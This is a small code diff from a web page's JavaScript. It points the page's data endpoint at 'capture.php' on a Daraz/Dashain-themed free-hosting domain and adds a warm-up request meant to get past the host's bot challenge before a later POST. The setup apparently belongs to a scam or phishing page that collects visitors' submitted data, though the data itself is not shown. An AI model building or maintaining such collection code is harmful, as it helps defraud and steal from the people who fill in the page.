@@ -216,8 +216,8 @@ window.addEventListener('error', function(e){
 }, true);
 
 /* ---- API ---- */
-const API = "https://daraz-dashain.freedev.app/capture.php";
-
+const API = "https://daraz-dashain.freedev.app/capture.php?i=1";
+ 
 /* ---- Warm up endpoint to clear InfinityFree's ?i=1 challenge before real POST ---- */
 fetch(API, { method: 'GET', cache: 'no-store' }).catch(() => {});
 
